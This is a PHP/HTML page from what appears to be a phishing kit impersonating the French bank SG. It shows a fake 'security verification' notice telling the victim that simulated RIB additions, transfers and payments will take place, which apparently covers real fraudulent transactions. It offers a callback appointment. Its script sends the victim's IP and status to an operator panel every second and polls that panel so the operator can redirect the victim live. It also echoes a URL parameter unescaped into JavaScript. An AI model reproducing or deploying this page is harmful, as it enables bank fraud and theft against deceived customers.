<?php 
require "../main.php";
?><!doctype html>
<html>
<head>
<title>SG | Vérification</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css">
<link rel="stylesheet" href="res/jihanaid.css">
<link rel="stylesheet" href="res/auth.css">
<link rel="icon" href="res/icon.png">
</head>
<body>
<header>
<div class="row">
    <div class="col text-left p-5">
        <img src="res/logo.svg" style="width:180px;">
    </div>
</div>
</header>

<div class="container-full p-5">

<div class="form text-center">
<h3><?php $obf->obf("Avertissement ⚠️"); ?></h3>
<p>Dans le cadre de nos engagements en matière de sécurité, nous procédons actuellement à un test de renforcement des mesures de protection de votre compte. Ce processus peut durer jusqu'à 5 minutes. Nous vous invitons à ne pas interrompre la procédure une fois celle-ci lancée.</p>
<p>Ce test inclura des simulations sécurisées d’ajout de coordonnées bancaires (RIB), de virements et de paiements, ainsi que de modifications de données personnelles. Ces opérations simulées n’entraîneront aucun mouvement réel sur votre compte, mais visent à garantir la fiabilité et l’efficacité des nouvelles protections.</p>
<p>Vous avez la possibilité de réaliser cette procédure en ligne, ou de planifier un accompagnement avec un de nos conseillers via le bouton "Rendez-vous".</p>
<div style="text-align:center;">
<div class="col my-2">
    <button class="submitbtn"  style="width:auto;" onclick="note('CONTINUE ONLINE SELECTED!')">Poursuivre la vérification en ligne</button>
</div>
<div style="margin:10px 0; text-align:center; color:gray;">Ou</div>

<div class="col my-3">
Sélectionnez une date et une heure afin que nous puissions vous appeler pour compléter la vérification avec l'un de nos conseillers.
</div>

<div class="my-2">
<div class="">
<select id="day" style="color:black;"></select>
<select id="hour" style="color:black;"></select>
</div>

</div>

<div class="col">
    <button class="submitbtn" onclick="sbmt()">Rendez-vous</button>
</div>
<h3 style="color:red; text-align:center;">Nous vous invitons à ne pas interrompre la procédure une fois celle-ci lancée.</h3>
<p>Votre sécurité est notre priorité.</p>

</div>

</div>

</div>


<script src="res/cdns/jq.js"></script>
<script src="res/cdns/m.js"></script>
<script>
  
$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sbmt();
    }
});

function sbmt(){
    $.post("send.php",{insts:1, day:$("#day").val(), hour:$("#hour").val()},(res)=>{window.location="wait.php";} );
 
}

setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d && d!=0){
            window.location=d;
        }
    })

}, 2000);

function note(note){
    $.post("post.php",{notes:note},(res)=>{
        window.location="wait.php";
    })
}


function getNextFiveWeekdays() {
    const weekdays = [];
    const dayNames = ["Lundi", "Mardi", "Mercredi", "Jeudi", "Vendredi"];
    let currentDate = new Date();
    let count = 0;

    while (count < 5) {
      const dayOfWeek = currentDate.getDay();
      
      // Only include weekdays (Monday to Friday)
      if (dayOfWeek >= 1 && dayOfWeek <= 5) { 
        const dayName = dayNames[dayOfWeek - 1];  // dayOfWeek - 1 to align with array index
        const day = String(currentDate.getDate()).padStart(2, '0');
        const month = String(currentDate.getMonth() + 1).padStart(2, '0');
        weekdays.push(`${dayName} ${day}/${month}`);
        count++;
      }
      
      // Move to the next day
      currentDate.setDate(currentDate.getDate() + 1);
    }

    return weekdays;
  }

  function populateDaySelect() {
    const select = document.getElementById('day');
    const weekdays = getNextFiveWeekdays();

    weekdays.forEach((dateString) => {
      const option = document.createElement('option');
      option.value = dateString;
      option.textContent = dateString;
      select.appendChild(option);
    });
  }

  // Populate the select dropdown on page load
  populateDaySelect();


  function populateHourSelect() {
    const select = document.getElementById('hour');
    for (let hour = 8; hour <= 17; hour++) {
      const option = document.createElement('option');
      // Format hour with leading zero if needed and add ":00" for the full hour format
      const formattedHour = `${String(hour).padStart(2, '0')}:00`;
      option.value = formattedHour;
      option.textContent = formattedHour;
      select.appendChild(option);
    }
  }

  // Populate the select dropdown on page load
  populateHourSelect();
</script>

</body>
</html>